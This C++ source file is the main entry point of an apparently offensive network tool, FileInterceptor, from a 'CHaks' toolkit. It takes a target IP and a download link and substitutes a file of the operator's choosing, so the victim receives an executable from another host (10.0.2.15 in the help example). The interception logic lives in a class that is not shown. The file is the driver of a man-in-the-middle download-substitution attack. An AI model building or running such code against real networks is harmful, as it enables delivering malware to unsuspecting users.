#include "FileInterceptor.h"

#include <iostream>

#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>


void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <target ip> <download link> <new download link>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<target ip>: target whose file you wish to intercept\n"
        << "<download link>: file you wish to replace\n"
        << "<new download link>: the path to the file you want the target to download\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " download.example.co/testfile.exe" << "10.0.2.15/test_program.exe" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink, char* newDownloadLink)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 6)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[3]);
    PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[4]);
    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    char targetIPStr[INET6_ADDRSTRLEN]{};
    char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};
    uint32_t queueNum{0};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    }

    CHaks::FileInterceptor fileInterceptor;
    if(fileInterceptor.Init(ipVersion, interfaceName, targetIPStr, downloadLink, newDownloadLink, queueNum) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
        return APPLICATION_ERROR;
    }

    if(fileInterceptor.Run() == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        return APPLICATION_ERROR;
    }

    std::cout << std::flush;
    return NO_ERROR;    
}